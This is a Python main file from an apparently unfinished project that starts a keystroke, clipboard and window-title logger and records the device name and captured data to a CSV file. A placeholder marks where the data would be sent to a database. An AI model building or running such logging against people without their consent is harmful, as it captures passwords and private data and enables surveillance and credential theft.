########################################################################################################################
#               This is the main.py for this project where the core of the project's code should be.                   #
#               Try to keep the code as modular as possible by separating it into functions and classes.               #
#                                                                                                                      #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Library imports here
import window_info_logger as wilogger
import keystrokes_and_clipboard_logger as kclogger
import os
import socket
from datetime import datetime
import time
import csv


def check_if_time_passed(old_time, time_passed):
    if time.time() - old_time >= time_passed:
        return True


def log_time(csv_file, time_since_epoch):
    current_time = datetime.fromtimestamp(time_since_epoch)
    current_time_hour_minute_seconds = current_time.strftime('%H:%M:%S')
    csv_file.writerow([f"\n[TIME]: {current_time_hour_minute_seconds} "])


def initialise_log_file(csv_file):
    device_name = socket.gethostname()
    csv_file.writerow([f"Device name: {device_name}"])
    csv_file.writerow([f"Date & time: {datetime.now()}"])
    csv_file.writerow(["======================================================"])

    # Vaststellen kolommen
    # vóór versturen naar DB moet device_nam
    csv_file.writerow(["datetime", "application_title", "window_title", "data_ID", "logged_data"])


# Main code here
def main():
    if os.path.isfile("logged_data.csv"):
        # Add code for sending data to database here.
        os.remove("logged_data.csv")
    old_time = time.time()
    note_interval_seconds = 2

    with open('logged_data.csv', 'a+', newline='') as f:
        csvreader = csv.writer(f)
        initialise_log_file(csvreader)  # Note user info and starting date + time of keylogger.
        kc_logger_object = kclogger.KeysClipboardLogger(csvreader)  # Start keylogger.
        window_logger_object = wilogger.WindowLogger(csvreader)  # Start window logger.
        # while True:
        #     # Als minuut voorbij gegaan of van scherm gewisseld: haal data op
        #     if check_if_time_passed(old_time, note_interval_seconds) or window_logger_object.screen_changed():
        #         old_time = time.time()
        #         log_time(csvreader, old_time)
            #
            # window_logger_object.log_window()
            # kc_logger_object.log_clipboard()


if __name__ == '__main__':
    main()
